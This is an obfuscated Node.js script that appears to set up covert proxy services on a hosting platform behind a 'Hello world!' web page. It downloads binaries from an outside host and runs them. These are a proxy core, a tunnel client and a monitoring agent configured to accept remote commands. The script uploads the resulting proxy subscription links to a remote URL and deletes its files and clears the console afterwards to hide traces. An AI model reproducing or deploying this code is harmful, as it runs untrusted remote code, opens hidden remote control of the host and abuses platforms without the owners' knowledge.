const _0x241800=_0x1b36;(function(_0x473962,_0xdcb9a){const _0x50972e=_0x1b36,_0x35fb49=_0x473962();while(!![]){try{const _0x228651=parseInt(_0x50972e(0x1c9))/0x1+-parseInt(_0x50972e(0x18d))/0x2+parseInt(_0x50972e(0x186))/0x3*(-parseInt(_0x50972e(0x1a5))/0x4)+parseInt(_0x50972e(0x1cf))/0x5*(parseInt(_0x50972e(0x1a7))/0x6)+parseInt(_0x50972e(0x1b3))/0x7*(parseInt(_0x50972e(0x183))/0x8)+parseInt(_0x50972e(0x1de))/0x9+-parseInt(_0x50972e(0x17a))/0xa;if(_0x228651===_0xdcb9a)break;else _0x35fb49['push'](_0x35fb49['shift']());}catch(_0x3712f5){_0x35fb49['push'](_0x35fb49['shift']());}}}(_0x2af3,0x4dd22));const express=require(_0x241800(0x1d9)),app=express(),axios=require(_0x241800(0x1c2)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require('util'),exec=promisify(require(_0x241800(0x1d6))[_0x241800(0x20c)]),{execSync}=require(_0x241800(0x1d6)),UPLOAD_URL=process[_0x241800(0x204)][_0x241800(0x166)]||'',PROJECT_URL=process['env'][_0x241800(0x1e1)]||'',AUTO_ACCESS=process[_0x241800(0x204)][_0x241800(0x173)]||![],FILE_PATH=process[_0x241800(0x204)][_0x241800(0x165)]||_0x241800(0x1ae),SUB_PATH=process[_0x241800(0x204)]['SUB_PATH']||'atupos',PORT=process['env']['SERVER_PORT']||process[_0x241800(0x204)][_0x241800(0x1af)]||0xbb8,UUID=process[_0x241800(0x204)][_0x241800(0x1fd)]||_0x241800(0x21c),NEZHA_SERVER=process[_0x241800(0x204)][_0x241800(0x1cc)]||'',NEZHA_PORT=process[_0x241800(0x204)][_0x241800(0x19e)]||'',NEZHA_KEY=process['env'][_0x241800(0x1b4)]||'',ARGO_DOMAIN=process[_0x241800(0x204)][_0x241800(0x1bf)]||_0x241800(0x176),ARGO_AUTH=process[_0x241800(0x204)][_0x241800(0x1bc)]||_0x241800(0x198),ARGO_PORT=process['env'][_0x241800(0x1a0)]||0x1f41,CFIP=process[_0x241800(0x204)][_0x241800(0x1d8)]||_0x241800(0x189),CFPORT=process['env'][_0x241800(0x17f)]||0x1bb,NAME=process['env']['NAME']||'Atupos';!fs[_0x241800(0x1b6)](FILE_PATH)?(fs[_0x241800(0x1e8)](FILE_PATH),console['log'](FILE_PATH+'\x20is\x20created')):console[_0x241800(0x1e3)](FILE_PATH+_0x241800(0x18e));function generateRandomName(){const _0x496afd=_0x241800,_0x117ef3=_0x496afd(0x19a);let _0x562481='';for(let _0x7aa3b0=0x0;_0x7aa3b0<0x6;_0x7aa3b0++){_0x562481+=_0x117ef3[_0x496afd(0x1e0)](Math[_0x496afd(0x191)](Math[_0x496afd(0x19b)]()*_0x117ef3['length']));}return _0x562481;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path[_0x241800(0x1fc)](FILE_PATH,phpName),webPath=path[_0x241800(0x1fc)](FILE_PATH,webName),botPath=path[_0x241800(0x1fc)](FILE_PATH,botName),subPath=path[_0x241800(0x1fc)](FILE_PATH,_0x241800(0x1cb)),listPath=path[_0x241800(0x1fc)](FILE_PATH,'list.txt'),bootLogPath=path[_0x241800(0x1fc)](FILE_PATH,_0x241800(0x1d0)),configPath=path[_0x241800(0x1fc)](FILE_PATH,_0x241800(0x20d));function _0x2af3(){const _0x2c82d3=['cdns.doon.eu.org','\x0avless://','then','set','114340LGUcAP','\x20already\x20exists','utf-8','toString','floor','npm\x20running\x20error:\x20','match','response','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','automatic\x20access\x20task\x20added\x20successfully','tls','eyJhIjoiZmFjNWExNDI1YmRjNWU5MzhkNDdhODM3MTlmM2Y2ZGEiLCJ0IjoiN2E3YzgxOGEtNDE3NS00MjlkLWFiODItMTI3M2M0NzE0ZDVhIiwicyI6Ik9ERXpNamcwWkRBdFpHTXhNaTAwT1dOaExXSTNOak10TnpKbVlUazJZelkyT0dJeCJ9','https://arm64.ssss.nyc.mn/web','abcdefghijklmnopqrstuvwxyz','random','post','/api/add-subscriptions','NEZHA_PORT','from','ARGO_PORT','arm','del\x20/f\x20/q\x20','\x20-c\x20\x22','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','8HLyvtA','quic','78uflNfH','&fp=firefox&type=ws&host=','443','fileName','/api/add-nodes','send','map','./tmp','PORT','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','application/json','finish','28GUinnC','NEZHA_KEY','status','existsSync','Unhandled\x20error\x20in\x20startserver:','includes','https://arm64.ssss.nyc.mn/v1','&path=%2Fvless-argo%3Fed%3D2560#','https+local://8.8.8.8/dns-query','ARGO_AUTH','tunnel.json','.exe\x20>\x20nul\x202>&1','ARGO_DOMAIN','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','Empowerment\x20failed\x20for\x20','axios','catch','NEZHA\x20variable\x20is\x20empty,skip\x20running','isFile','close','firefox','amd','230853nJSvSY','text/plain;\x20charset=utf-8','sub.txt','NEZHA_SERVER','/vmess-argo','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','143730yjIMdZ','boot.log','Skipping\x20adding\x20automatic\x20access\x20task','all','/tunnel.yml\x20run','readdirSync','\x20>\x20nul\x202>&1','child_process','error','CFIP','express','filter','\x0a\x20\x20tunnel:\x20','test','writeFileSync','730890XnChwo','tunnel.yml','charAt','PROJECT_URL','basename','log','vless','win32','substring','arm64','mkdirSync','\x20is\x20running','TunnelSecret','https://arm64.ssss.nyc.mn/agent','true','127.0.0.1','createWriteStream','\x20-p\x20','https://amd64.ssss.nyc.mn/agent','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','base64','web\x20running\x20error:\x20','aarch64','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','platform','tcp','https://arm64.ssss.nyc.mn/bot','?security=tls&sni=','none','Error\x20in\x20startserver:','join','UUID','Error\x20executing\x20command:\x20','data','\x20>/dev/null\x202>&1\x20&','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','arch','/api/delete-nodes','env','direct','/dev/null','pipe','&path=%2Ftrojan-argo%3Fed%3D2560#','/config.json\x20>/dev/null\x202>&1\x20&','Hello\x20world!','forEach','exec','config.json','App\x20is\x20running','https://amd64.ssss.nyc.mn/v1','\x20-c\x20','freedom','readFileSync','nohup\x20','pkill\x20-f\x20\x22[','Error\x20downloading\x20files:','2087','/vless-argo','http','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Add\x20automatic\x20access\x20task\x20faild:\x20','pop','a43ab9d9-56da-4614-a2c3-943f981da022','https://amd64.ssss.nyc.mn/bot','unshift','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','message','push','false','FILE_PATH','UPLOAD_URL','Empowerment\x20success\x20for\x20','Content-Type','\x0aclient_secret:\x20','get','\x20failed:\x20','blackhole','2053','\x20successfully','taskkill\x20/f\x20/im\x20','http\x20server\x20is\x20running\x20on\x20port:','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','Nodes\x20uploaded\x20successfully','AUTO_ACCESS','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','block','atupos.d58s.ggff.net','unlinkSync','Error\x20reading\x20boot.log:','unlink','4958450gissNW','statSync','\x0a\x20\x20\x20\x20','8443','split','CFPORT','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x22\x20>\x20/dev/null\x202>&1','stringify','401384PbMnZh','\x0a\x20\x20credentials-file:\x20','length','22026ZXcigh','?encryption=none&security=tls&sni=','2083'];_0x2af3=function(){return _0x2c82d3;};return _0x2af3();}function deleteNodes(){const _0x4c442f=_0x241800;try{if(!UPLOAD_URL)return;if(!fs[_0x4c442f(0x1b6)](subPath))return;let _0x5cfa79;try{_0x5cfa79=fs['readFileSync'](subPath,_0x4c442f(0x18f));}catch{return null;}const _0x487e4f=Buffer[_0x4c442f(0x19f)](_0x5cfa79,_0x4c442f(0x1f2))[_0x4c442f(0x190)](_0x4c442f(0x18f)),_0x393ab7=_0x487e4f[_0x4c442f(0x17e)]('\x0a')[_0x4c442f(0x1da)](_0x3d1d44=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4c442f(0x1dc)](_0x3d1d44));if(_0x393ab7['length']===0x0)return;return axios[_0x4c442f(0x19c)](UPLOAD_URL+_0x4c442f(0x203),JSON[_0x4c442f(0x182)]({'nodes':_0x393ab7}),{'headers':{'Content-Type':_0x4c442f(0x1b1)}})[_0x4c442f(0x1c3)](_0x295936=>{return null;}),null;}catch(_0x4baeea){return null;}}function cleanupOldFiles(){const _0x27900c=_0x241800;try{const _0x44652c=fs[_0x27900c(0x1d4)](FILE_PATH);_0x44652c[_0x27900c(0x20b)](_0xe641ec=>{const _0x16f19a=_0x27900c,_0x33c5c8=path[_0x16f19a(0x1fc)](FILE_PATH,_0xe641ec);try{const _0x3c0698=fs[_0x16f19a(0x17b)](_0x33c5c8);_0x3c0698[_0x16f19a(0x1c5)]()&&fs[_0x16f19a(0x177)](_0x33c5c8);}catch(_0x3543d2){}});}catch(_0x4b664c){}}app[_0x241800(0x16a)]('/',function(_0x2cb741,_0x4296a7){const _0x306f8f=_0x241800;_0x4296a7[_0x306f8f(0x1ac)](_0x306f8f(0x20a));});async function generateConfig(){const _0x141e6a=_0x241800,_0x1bdb61={'log':{'access':_0x141e6a(0x206),'error':_0x141e6a(0x206),'loglevel':_0x141e6a(0x1fa)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x141e6a(0x1e4),'settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x141e6a(0x1fa),'fallbacks':[{'dest':0xbb9},{'path':_0x141e6a(0x217),'dest':0xbba},{'path':_0x141e6a(0x1cd),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x141e6a(0x1f7)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x141e6a(0x1e4),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':'tcp','security':_0x141e6a(0x1fa)}},{'port':0xbba,'listen':_0x141e6a(0x1ed),'protocol':_0x141e6a(0x1e4),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x141e6a(0x1fa)},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x141e6a(0x217)}},'sniffing':{'enabled':!![],'destOverride':[_0x141e6a(0x218),_0x141e6a(0x197),_0x141e6a(0x1a6)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x141e6a(0x1ed),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x141e6a(0x1cd)}},'sniffing':{'enabled':!![],'destOverride':[_0x141e6a(0x218),_0x141e6a(0x197),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x141e6a(0x1ed),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x141e6a(0x1fa),'wsSettings':{'path':'/trojan-argo'}},'sniffing':{'enabled':!![],'destOverride':[_0x141e6a(0x218),_0x141e6a(0x197),_0x141e6a(0x1a6)],'metadataOnly':![]}}],'dns':{'servers':[_0x141e6a(0x1bb)]},'outbounds':[{'protocol':_0x141e6a(0x211),'tag':_0x141e6a(0x205)},{'protocol':_0x141e6a(0x16c),'tag':_0x141e6a(0x175)}]};fs[_0x141e6a(0x1dd)](path[_0x141e6a(0x1fc)](FILE_PATH,_0x141e6a(0x20d)),JSON[_0x141e6a(0x182)](_0x1bdb61,null,0x2));}function getSystemArchitecture(){const _0x39c40f=_0x241800,_0x23c685=os[_0x39c40f(0x202)]();return _0x23c685===_0x39c40f(0x1a1)||_0x23c685===_0x39c40f(0x1e7)||_0x23c685===_0x39c40f(0x1f4)?_0x39c40f(0x1a1):_0x39c40f(0x1c8);}function downloadFile(_0x5409ef,_0x5bdd5e,_0x376b1b){const _0x2bab64=_0x241800,_0x4b30dc=_0x5409ef;!fs[_0x2bab64(0x1b6)](FILE_PATH)&&fs[_0x2bab64(0x1e8)](FILE_PATH,{'recursive':!![]});const _0xf32c80=fs[_0x2bab64(0x1ee)](_0x4b30dc);axios({'method':_0x2bab64(0x16a),'url':_0x5bdd5e,'responseType':'stream'})[_0x2bab64(0x18b)](_0x12223f=>{const _0x9e4dae=_0x2bab64;_0x12223f[_0x9e4dae(0x1ff)][_0x9e4dae(0x207)](_0xf32c80),_0xf32c80['on'](_0x9e4dae(0x1b2),()=>{const _0x3d5fec=_0x9e4dae;_0xf32c80[_0x3d5fec(0x1c6)](),console[_0x3d5fec(0x1e3)]('Download\x20'+path[_0x3d5fec(0x1e2)](_0x4b30dc)+_0x3d5fec(0x16e)),_0x376b1b(null,_0x4b30dc);}),_0xf32c80['on'](_0x9e4dae(0x1d7),_0x1e6439=>{const _0xb6eda9=_0x9e4dae;fs[_0xb6eda9(0x179)](_0x4b30dc,()=>{});const _0x2d9991='Download\x20'+path['basename'](_0x4b30dc)+_0xb6eda9(0x16b)+_0x1e6439['message'];console[_0xb6eda9(0x1d7)](_0x2d9991),_0x376b1b(_0x2d9991);});})[_0x2bab64(0x1c3)](_0x2a04f5=>{const _0x4f5b0e=_0x2bab64,_0x4f3827='Download\x20'+path[_0x4f5b0e(0x1e2)](_0x4b30dc)+'\x20failed:\x20'+_0x2a04f5[_0x4f5b0e(0x220)];console['error'](_0x4f3827),_0x376b1b(_0x4f3827);});}function _0x1b36(_0x186dff,_0x30ff1c){const _0x2af382=_0x2af3();return _0x1b36=function(_0x1b36ff,_0x50a583){_0x1b36ff=_0x1b36ff-0x163;let _0x1d88ee=_0x2af382[_0x1b36ff];return _0x1d88ee;},_0x1b36(_0x186dff,_0x30ff1c);}async function downloadFilesAndRun(){const _0x52b01b=_0x241800,_0x431c20=getSystemArchitecture(),_0x19690d=getFilesForArchitecture(_0x431c20);if(_0x19690d[_0x52b01b(0x185)]===0x0){console[_0x52b01b(0x1e3)](_0x52b01b(0x1f5));return;}const _0x137b64=_0x19690d[_0x52b01b(0x1ad)](_0x2d4927=>{return new Promise((_0x4e32ff,_0x426815)=>{const _0x7e4f36=_0x1b36;downloadFile(_0x2d4927[_0x7e4f36(0x1aa)],_0x2d4927['fileUrl'],(_0x10fb60,_0x2c7075)=>{_0x10fb60?_0x426815(_0x10fb60):_0x4e32ff(_0x2c7075);});});});try{await Promise[_0x52b01b(0x1d2)](_0x137b64);}catch(_0x37ffb2){console[_0x52b01b(0x1d7)](_0x52b01b(0x215),_0x37ffb2);return;}function _0x2da728(_0x3fafd8){const _0x4310a0=0x1fd;_0x3fafd8['forEach'](_0x44a2c3=>{const _0x562433=_0x1b36;fs[_0x562433(0x1b6)](_0x44a2c3)&&fs['chmod'](_0x44a2c3,_0x4310a0,_0x4155cd=>{const _0x2c2988=_0x562433;_0x4155cd?console[_0x2c2988(0x1d7)](_0x2c2988(0x1c1)+_0x44a2c3+':\x20'+_0x4155cd):console[_0x2c2988(0x1e3)](_0x2c2988(0x167)+_0x44a2c3+':\x20'+_0x4310a0[_0x2c2988(0x190)](0x8));});});}const _0x4c430d=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x2da728(_0x4c430d);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3b6adb=NEZHA_SERVER[_0x52b01b(0x1b8)](':')?NEZHA_SERVER[_0x52b01b(0x17e)](':')[_0x52b01b(0x21b)]():'',_0x481935=new Set([_0x52b01b(0x1a9),'8443','2096',_0x52b01b(0x216),_0x52b01b(0x188),_0x52b01b(0x16d)]),_0xc22b52=_0x481935['has'](_0x3b6adb)?_0x52b01b(0x1ec):_0x52b01b(0x164),_0x524165=_0x52b01b(0x169)+NEZHA_KEY+_0x52b01b(0x1c0)+NEZHA_SERVER+_0x52b01b(0x219)+_0xc22b52+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x52b01b(0x1dd)](path['join'](FILE_PATH,'config.yaml'),_0x524165);const _0x5d501c=_0x52b01b(0x213)+phpPath+_0x52b01b(0x1a3)+FILE_PATH+_0x52b01b(0x1b0);try{await exec(_0x5d501c),console[_0x52b01b(0x1e3)](phpName+_0x52b01b(0x1e9)),await new Promise(_0x42df08=>setTimeout(_0x42df08,0x3e8));}catch(_0x2e5ebb){console[_0x52b01b(0x1d7)]('php\x20running\x20error:\x20'+_0x2e5ebb);}}else{let _0x31ea97='';const _0x453b57=['443',_0x52b01b(0x17d),'2096','2087','2083',_0x52b01b(0x16d)];_0x453b57[_0x52b01b(0x1b8)](NEZHA_PORT)&&(_0x31ea97='--tls');const _0x1ce335=_0x52b01b(0x213)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x52b01b(0x1ef)+NEZHA_KEY+'\x20'+_0x31ea97+_0x52b01b(0x171);try{await exec(_0x1ce335),console[_0x52b01b(0x1e3)](npmName+_0x52b01b(0x1e9)),await new Promise(_0x345259=>setTimeout(_0x345259,0x3e8));}catch(_0xfd1a2d){console[_0x52b01b(0x1d7)](_0x52b01b(0x192)+_0xfd1a2d);}}}else console['log'](_0x52b01b(0x1c4));const _0x4a5fb2='nohup\x20'+webPath+_0x52b01b(0x210)+FILE_PATH+_0x52b01b(0x209);try{await exec(_0x4a5fb2),console['log'](webName+_0x52b01b(0x1e9)),await new Promise(_0x52ccce=>setTimeout(_0x52ccce,0x3e8));}catch(_0x5db5df){console[_0x52b01b(0x1d7)](_0x52b01b(0x1f3)+_0x5db5df);}if(fs[_0x52b01b(0x1b6)](botPath)){let _0x5a9c1f;if(ARGO_AUTH[_0x52b01b(0x193)](/^[A-Z0-9a-z=]{120,250}$/))_0x5a9c1f='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x52b01b(0x193)](/TunnelSecret/)?_0x5a9c1f=_0x52b01b(0x1ce)+FILE_PATH+_0x52b01b(0x1d3):_0x5a9c1f=_0x52b01b(0x1f1)+FILE_PATH+_0x52b01b(0x195)+ARGO_PORT;try{await exec(_0x52b01b(0x213)+botPath+'\x20'+_0x5a9c1f+_0x52b01b(0x200)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x3d0f80=>setTimeout(_0x3d0f80,0x7d0));}catch(_0x3c6bfa){console[_0x52b01b(0x1d7)](_0x52b01b(0x1fe)+_0x3c6bfa);}}await new Promise(_0x43e025=>setTimeout(_0x43e025,0x1388));}function getFilesForArchitecture(_0x2a0357){const _0x3f0c96=_0x241800;let _0x44aae5;_0x2a0357===_0x3f0c96(0x1a1)?_0x44aae5=[{'fileName':webPath,'fileUrl':_0x3f0c96(0x199)},{'fileName':botPath,'fileUrl':_0x3f0c96(0x1f8)}]:_0x44aae5=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x3f0c96(0x21d)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x146c3c=_0x2a0357===_0x3f0c96(0x1a1)?_0x3f0c96(0x1eb):_0x3f0c96(0x1f0);_0x44aae5[_0x3f0c96(0x21e)]({'fileName':npmPath,'fileUrl':_0x146c3c});}else{const _0x4f3d50=_0x2a0357==='arm'?_0x3f0c96(0x1b9):_0x3f0c96(0x20f);_0x44aae5[_0x3f0c96(0x21e)]({'fileName':phpPath,'fileUrl':_0x4f3d50});}}return _0x44aae5;}function argoType(){const _0x28c77e=_0x241800;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x28c77e(0x1e3)](_0x28c77e(0x201));return;}if(ARGO_AUTH['includes'](_0x28c77e(0x1ea))){fs[_0x28c77e(0x1dd)](path[_0x28c77e(0x1fc)](FILE_PATH,_0x28c77e(0x1bd)),ARGO_AUTH);const _0x2b057d=_0x28c77e(0x1db)+ARGO_AUTH['split']('\x22')[0xb]+_0x28c77e(0x184)+path[_0x28c77e(0x1fc)](FILE_PATH,_0x28c77e(0x1bd))+_0x28c77e(0x180)+ARGO_DOMAIN+_0x28c77e(0x21f)+ARGO_PORT+_0x28c77e(0x174);fs[_0x28c77e(0x1dd)](path[_0x28c77e(0x1fc)](FILE_PATH,_0x28c77e(0x1df)),_0x2b057d);}else console[_0x28c77e(0x1e3)]('ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel');}argoType();async function extractDomains(){const _0x26e5b1=_0x241800;let _0x3114a3;if(ARGO_AUTH&&ARGO_DOMAIN)_0x3114a3=ARGO_DOMAIN,console['log']('ARGO_DOMAIN:',_0x3114a3),await _0xb8eefb(_0x3114a3);else try{const _0x351c1c=fs['readFileSync'](path['join'](FILE_PATH,'boot.log'),_0x26e5b1(0x18f)),_0x47771b=_0x351c1c[_0x26e5b1(0x17e)]('\x0a'),_0x392891=[];_0x47771b[_0x26e5b1(0x20b)](_0x32c82a=>{const _0x28e048=_0x26e5b1,_0x29b23c=_0x32c82a[_0x28e048(0x193)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x29b23c){const _0x41aa6a=_0x29b23c[0x1];_0x392891['push'](_0x41aa6a);}});if(_0x392891['length']>0x0)_0x3114a3=_0x392891[0x0],console[_0x26e5b1(0x1e3)]('ArgoDomain:',_0x3114a3),await _0xb8eefb(_0x3114a3);else{console[_0x26e5b1(0x1e3)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs[_0x26e5b1(0x177)](path['join'](FILE_PATH,'boot.log'));async function _0x3fb4ad(){const _0x2d1432=_0x26e5b1;try{process[_0x2d1432(0x1f6)]===_0x2d1432(0x1e5)?await exec(_0x2d1432(0x16f)+botName+_0x2d1432(0x1be)):await exec(_0x2d1432(0x214)+botName[_0x2d1432(0x1e0)](0x0)+']'+botName[_0x2d1432(0x1e6)](0x1)+_0x2d1432(0x181));}catch(_0x55caa6){}}_0x3fb4ad(),await new Promise(_0x48d72b=>setTimeout(_0x48d72b,0xbb8));const _0x667a75='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x26e5b1(0x195)+ARGO_PORT;try{await exec(_0x26e5b1(0x213)+botPath+'\x20'+_0x667a75+_0x26e5b1(0x200)),console[_0x26e5b1(0x1e3)](botName+_0x26e5b1(0x1e9)),await new Promise(_0x14777f=>setTimeout(_0x14777f,0xbb8)),await extractDomains();}catch(_0x1c4400){console[_0x26e5b1(0x1d7)]('Error\x20executing\x20command:\x20'+_0x1c4400);}}}catch(_0x55de83){console[_0x26e5b1(0x1d7)](_0x26e5b1(0x178),_0x55de83);}async function _0xb8eefb(_0x2c6830){const _0x534671=_0x26e5b1,_0x306d77=execSync('curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27',{'encoding':_0x534671(0x18f)}),_0x544537=_0x306d77['trim'](),_0x5d4ad3=NAME?NAME+'-'+_0x544537:_0x544537;return new Promise(_0x2daea0=>{setTimeout(()=>{const _0x38f52c=_0x1b36,_0x4f51c2={'v':'2','ps':''+_0x5d4ad3,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x38f52c(0x1fa),'net':'ws','type':'none','host':_0x2c6830,'path':'/vmess-argo?ed=2560','tls':_0x38f52c(0x197),'sni':_0x2c6830,'alpn':'','fp':_0x38f52c(0x1c7)},_0x577d42=_0x38f52c(0x18a)+UUID+'@'+CFIP+':'+CFPORT+_0x38f52c(0x187)+_0x2c6830+_0x38f52c(0x1a8)+_0x2c6830+_0x38f52c(0x1ba)+_0x5d4ad3+'\x0a\x20\x20\x0avmess://'+Buffer['from'](JSON[_0x38f52c(0x182)](_0x4f51c2))[_0x38f52c(0x190)](_0x38f52c(0x1f2))+'\x0a\x20\x20\x0atrojan://'+UUID+'@'+CFIP+':'+CFPORT+_0x38f52c(0x1f9)+_0x2c6830+_0x38f52c(0x1a8)+_0x2c6830+_0x38f52c(0x208)+_0x5d4ad3+_0x38f52c(0x17c);console['log'](Buffer[_0x38f52c(0x19f)](_0x577d42)[_0x38f52c(0x190)](_0x38f52c(0x1f2))),fs[_0x38f52c(0x1dd)](subPath,Buffer['from'](_0x577d42)[_0x38f52c(0x190)](_0x38f52c(0x1f2))),console[_0x38f52c(0x1e3)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0x38f52c(0x16a)]('/'+SUB_PATH,(_0x5b0b72,_0x22810a)=>{const _0x5a9b4f=_0x38f52c,_0x370f95=Buffer[_0x5a9b4f(0x19f)](_0x577d42)[_0x5a9b4f(0x190)](_0x5a9b4f(0x1f2));_0x22810a[_0x5a9b4f(0x18c)](_0x5a9b4f(0x168),_0x5a9b4f(0x1ca)),_0x22810a['send'](_0x370f95);}),_0x2daea0(_0x577d42);},0x7d0);});}}async function uploadNodes(){const _0x3b7caf=_0x241800;if(UPLOAD_URL&&PROJECT_URL){const _0x312b1d=PROJECT_URL+'/'+SUB_PATH,_0xc12643={'subscription':[_0x312b1d]};try{const _0x480b70=await axios['post'](UPLOAD_URL+_0x3b7caf(0x19d),_0xc12643,{'headers':{'Content-Type':_0x3b7caf(0x1b1)}});return _0x480b70&&_0x480b70[_0x3b7caf(0x1b5)]===0xc8?(console[_0x3b7caf(0x1e3)]('Subscription\x20uploaded\x20successfully'),_0x480b70):null;}catch(_0x437a6c){if(_0x437a6c[_0x3b7caf(0x194)]){if(_0x437a6c[_0x3b7caf(0x194)][_0x3b7caf(0x1b5)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0xcf71cc=fs[_0x3b7caf(0x212)](listPath,'utf-8'),_0x5966b0=_0xcf71cc[_0x3b7caf(0x17e)]('\x0a')[_0x3b7caf(0x1da)](_0x30bf02=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x30bf02));if(_0x5966b0[_0x3b7caf(0x185)]===0x0)return;const _0x1cb581=JSON[_0x3b7caf(0x182)]({'nodes':_0x5966b0});try{const _0x1aab1d=await axios[_0x3b7caf(0x19c)](UPLOAD_URL+_0x3b7caf(0x1ab),_0x1cb581,{'headers':{'Content-Type':_0x3b7caf(0x1b1)}});return _0x1aab1d&&_0x1aab1d[_0x3b7caf(0x1b5)]===0xc8?(console['log'](_0x3b7caf(0x172)),_0x1aab1d):null;}catch(_0x3c08b2){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x5ef731=_0x1b36,_0x4535f8=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x4535f8[_0x5ef731(0x163)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x4535f8[_0x5ef731(0x163)](phpPath);process['platform']===_0x5ef731(0x1e5)?exec(_0x5ef731(0x1a2)+_0x4535f8[_0x5ef731(0x1fc)]('\x20')+_0x5ef731(0x1d5),_0x58f1c2=>{const _0x59ca00=_0x5ef731;console['clear'](),console[_0x59ca00(0x1e3)](_0x59ca00(0x20e)),console['log'](_0x59ca00(0x1a4));}):exec('rm\x20-rf\x20'+_0x4535f8[_0x5ef731(0x1fc)]('\x20')+'\x20>/dev/null\x202>&1',_0xa27ac1=>{const _0x282be2=_0x5ef731;console['clear'](),console[_0x282be2(0x1e3)](_0x282be2(0x20e)),console['log'](_0x282be2(0x1a4));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4695ce=_0x241800;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x4695ce(0x1d1));return;}try{const _0x519512=await axios['post']('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4695ce(0x1b1)}});return console[_0x4695ce(0x1e3)](_0x4695ce(0x196)),_0x519512;}catch(_0x5b36e6){return console['error'](_0x4695ce(0x21a)+_0x5b36e6[_0x4695ce(0x220)]),null;}}async function startserver(){const _0x37e4db=_0x241800;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x3ac0e1){console[_0x37e4db(0x1d7)](_0x37e4db(0x1fb),_0x3ac0e1);}}startserver()[_0x241800(0x1c3)](_0x25cbbb=>{const _0x9e0c46=_0x241800;console[_0x9e0c46(0x1d7)](_0x9e0c46(0x1b7),_0x25cbbb);}),app['listen'](PORT,()=>console[_0x241800(0x1e3)](_0x241800(0x170)+PORT+'!'));
